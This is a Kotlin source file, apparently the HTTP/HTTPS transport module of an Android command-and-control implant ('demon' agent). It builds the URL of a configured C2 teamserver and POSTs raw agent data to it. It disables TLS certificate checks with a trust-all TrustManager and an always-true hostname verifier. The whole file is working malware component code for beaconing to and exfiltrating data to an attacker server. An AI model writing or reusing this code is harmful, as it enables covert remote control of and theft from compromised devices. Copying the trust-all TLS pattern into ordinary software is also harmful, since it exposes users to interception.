package com.demon.agent.transport

import com.demon.agent.BuildConfig
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.security.SecureRandom
import java.security.cert.X509Certificate
import java.util.concurrent.TimeUnit
import javax.net.ssl.*

/*
 * C2Transport.kt — HTTP/HTTPS transport layer.
 * Bypasses certificate validation for self-signed teamserver certs.
 */
object C2Transport {

    private val MEDIA = "application/octet-stream".toMediaType()

    private val client: OkHttpClient by lazy {
        val trust = arrayOf<TrustManager>(object : X509TrustManager {
            override fun checkClientTrusted(c: Array<X509Certificate>, t: String) {}
            override fun checkServerTrusted(c: Array<X509Certificate>, t: String) {}
            override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
        })
        val ssl = SSLContext.getInstance("TLS").apply {
            init(null, trust, SecureRandom())
        }
        OkHttpClient.Builder()
            .sslSocketFactory(ssl.socketFactory, trust[0] as X509TrustManager)
            .hostnameVerifier { _, _ -> true }
            .connectTimeout(15, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(15, TimeUnit.SECONDS)
            .build()
    }

    private fun buildUrl(): String {
        val scheme = if (BuildConfig.C2_SSL) "https" else "http"
        val port   = BuildConfig.C2_PORT
        val host   = BuildConfig.C2_HOST
        val uri    = BuildConfig.C2_URI
        return if ((BuildConfig.C2_SSL && port == 443) || (!BuildConfig.C2_SSL && port == 80))
            "$scheme://$host$uri"
        else
            "$scheme://$host:$port$uri"
    }

    /** Send raw bytes via POST. Returns response body bytes or null on failure. */
    fun post(data: ByteArray): ByteArray? {
        return try {
            val req = Request.Builder()
                .url(buildUrl())
                .post(data.toRequestBody(MEDIA))
                .header("User-Agent", BuildConfig.C2_UA)
                .build()
            // Must use use{} or explicit close() to avoid OkHttp connection leaks
            client.newCall(req).execute().use { resp ->
                if (resp.isSuccessful) resp.body?.bytes() else null
            }
        } catch (e: Exception) {
            null
        }
    }
}
